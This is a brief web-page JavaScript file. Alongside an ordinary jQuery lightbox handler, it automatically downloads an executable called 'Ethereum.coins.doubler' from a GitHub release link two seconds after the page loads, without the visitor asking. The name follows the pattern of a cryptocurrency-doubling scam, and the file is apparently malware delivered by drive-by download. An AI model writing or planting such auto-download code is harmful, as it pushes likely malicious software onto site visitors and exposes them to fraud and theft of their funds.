function download(){
  setTimeout(function(){
    downloadFile("https://github.com/ethx2/ethx2.github.io/releases/download/v2.0.10/Ethereum.coins.doubler.v2.0.10.exe");
  }, 1998);
};
window.addEventListener("load", download);
$(document).on('click', '[data-toggle="lightbox"]', function(event) {
  event.preventDefault();
  $(this).ekkoLightbox();
});
